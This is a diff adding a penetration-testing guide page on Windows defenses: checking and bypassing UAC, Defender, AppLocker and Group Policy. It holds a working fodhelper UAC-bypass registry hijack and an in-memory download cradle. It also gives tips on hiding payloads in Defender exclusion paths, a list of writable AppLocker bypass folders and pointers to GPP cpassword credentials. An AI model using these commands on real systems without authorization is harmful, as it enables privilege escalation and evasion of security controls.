@@ -1,0 +1,179 @@
+## The Mindset
+
+Understanding Windows defenses serves you three ways:
+
+- **Identify what's active** — Defender? AppLocker? UAC enforcing? Each changes your approach
+- **Understand the restrictions** — what's blocked and why
+- **Find the gaps** — defenses are only as strong as their configuration, and misconfigured controls are common
+
+This knowledge also sharpens your reporting — you can tell the client exactly which control was missing or misconfigured.
+
+---
+
+## UAC — User Account Control
+
+UAC is the prompt that asks "do you want to allow this app to make changes?" It exists because even administrator accounts run with a **standard-user token** by default. When admin rights are needed, UAC prompts to **elevate** to the full admin token.
+
+This creates the **Medium vs High integrity** distinction you saw in `whoami /groups`:
+
+| Integrity Level | Meaning                                         |
+| --------------- | ----------------------------------------------- |
+| **High**        | Elevated — full admin token, UAC already passed |
+| **Medium**      | Standard — admin account but not yet elevated   |
+| **Low**         | Sandboxed (e.g. browser tabs)                   |
+
+### Why It Matters
+
+If you get a shell as a member of the Administrators group but at **Medium** integrity, you have admin _membership_ but not admin _power_ — many actions (writing to `System32`, reading other users' data, dumping LSASS) will fail until you elevate to High.
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Check your integrity level
+whoami /groups | findstr /i "Mandatory Label"
+# "High Mandatory Level"   = elevated
+# "Medium Mandatory Level" = not elevated yet
+```
+
+### UAC Bypasses
+
+Bypassing UAC means going from Medium to High without triggering a prompt. There are dozens of techniques, generally abusing auto-elevating Windows binaries:
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# fodhelper bypass (classic) — abuses an auto-elevating binary + registry hijack
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /v DelegateExecute /t REG_SZ /f
+reg add "HKCU\Software\Classes\ms-settings\Shell\Open\command" /d "cmd.exe" /f
+fodhelper.exe
+```
+
+<Tip>
+  UAC is **not** considered a security boundary by Microsoft — it's a
+  convenience feature. That's why bypasses aren't treated as vulnerabilities and
+  there are so many. Tools like **UACMe** catalog dozens of techniques. Check
+  your integrity level early so you know whether you still need to bypass it.
+</Tip>
+
+---
+
+## Windows Defender
+
+Defender is the built-in antivirus and EDR. On a modern, defended box it's your biggest obstacle — it scans files, monitors behavior, and flags known offensive tools instantly.
+
+### Check Defender Status
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Is Defender running and what's enabled?
+sc query windefend
+```
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Detailed status — real-time protection, definitions
+Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled, IsTamperProtected
+
+# What exclusion paths exist? (drop payloads where Defender won't scan)
+Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+```
+
+<Tip>
+  **Exclusion paths are gold.** Admins often exclude folders (like a dev
+  directory or a backup share) from scanning for performance reasons. Drop your
+  payload in an excluded path and Defender ignores it. `Get-MpPreference`
+  reveals them — if you can read it.
+</Tip>
+
+### Working Around Defender
+
+The realistic approaches, in order of preference:
+
+- **Live off the land (LOLBins)** — use built-in Windows tools that aren't flagged (`certutil`, `rundll32`, `regsvr32`, PowerShell). No malicious file to detect
+- **In-memory execution** — download cradles that never write to disk (`IEX (New-Object Net.WebClient).DownloadString(...)`)
+- **Obfuscation** — modify tool signatures so they don't match known patterns
+- **Exclusion paths** — drop into a folder Defender doesn't scan
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Disabling Defender requires admin AND Tamper Protection off — usually not worth the noise
+# Far better to evade than to disable
+```
+
+<Tip>
+  Disabling Defender generates loud alerts and often fails due to Tamper
+  Protection. Evasion (LOLBins, in-memory, exclusion paths) beats disabling
+  almost every time on a monitored box.
+</Tip>
+
+---
+
+## AppLocker — Application Whitelisting
+
+AppLocker controls which applications and scripts are allowed to run, based on rules (publisher, path, or file hash). Where it's deployed, you can't just drop and run an arbitrary `.exe`.
+
+### Check AppLocker Policy
+
+```powershell theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Dump the effective AppLocker policy
+Get-AppLockerPolicy -Effective -Xml
+
+# Test whether a specific file would be allowed to run
+Get-AppLockerPolicy -Effective | Test-AppLockerPolicy -Path C:\Users\Public\payload.exe -User Everyone
+```
+
+### Bypassing AppLocker
+
+AppLocker bypasses exploit gaps in the rules. The most common:
+
+- **Writable allowed paths** — if a rule allows everything in `C:\Windows` but a subfolder there is user-writable, drop your payload in that subfolder
+- **LOLBins** — trusted, signed Microsoft binaries that can execute code (`regsvr32`, `rundll32`, `mshta`, `msbuild`) usually aren't blocked
+- **Alternate script hosts** — if `.exe` and `.ps1` are blocked but `.hta` or `.js` aren't, use those
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Default-allowed writable directories under C:\Windows that often bypass path rules
+# C:\Windows\Tasks
+# C:\Windows\Temp
+# C:\Windows\tracing
+# C:\Windows\System32\spool\drivers\color
+```
+
+<Tip>
+  AppLocker's default rules allow everything in `C:\Windows` and `C:\Program
+  Files`. The bypass is finding a **user-writable subfolder** inside those
+  trusted paths — the list above are the classic ones. Check them with `icacls`.
+</Tip>
+
+---
+
+## Group Policy
+
+Group Policy (GPO) is how Windows centrally enforces settings — security policies, software restrictions, scripts, and the configurations behind UAC, AppLocker, and Defender. On a domain, GPOs push down from the domain controller.
+
+```cmd theme={"theme":{"light":"github-light","dark":"tokyo-night"}}
+# Dump the effective policy applied to this machine/user
+gpresult /r
+
+# Full HTML report
+gpresult /h C:\Users\Public\gpreport.html
+```
+
+**Why you care:**
+
+- GPO reveals what's enforced — password policy, restricted groups, audit settings
+- **GPP (Group Policy Preferences)** historically stored credentials in SYSVOL with the famous `cpassword` (decryptable with a public AES key) — covered in [Pillaging](/tech/windows/pillaging)
+- Logon/startup scripts defined in GPO run automatically — a writable one is an escalation path
+
+<Tip>
+  On a domain, the SYSVOL share (`\\domain\SYSVOL`) is readable by all
+  authenticated users and contains GPO data — including any legacy `cpassword`
+  values. Always check it during domain pillaging.
+</Tip>
+
+---
+
+## Defenses at a Glance
+
+| Mechanism            | What It Does                     | Where It's Weak                                        |
+| -------------------- | -------------------------------- | ------------------------------------------------------ |
+| **UAC**              | Prompts to elevate Medium → High | Not a security boundary; many bypasses (UACMe)         |
+| **Windows Defender** | AV/EDR — scans and monitors      | Exclusion paths, LOLBins, in-memory execution          |
+| **AppLocker**        | Whitelists allowed apps/scripts  | Writable trusted paths, LOLBins, alt script hosts      |
+| **Group Policy**     | Centrally enforces settings      | GPP cpassword, writable logon scripts, readable SYSVOL |
+
+---
+
+_This concludes the Windows chapter. From here, head to [Windows Privilege Escalation](/attacks/privilege-escalation/windows) to turn everything you've enumerated into SYSTEM._
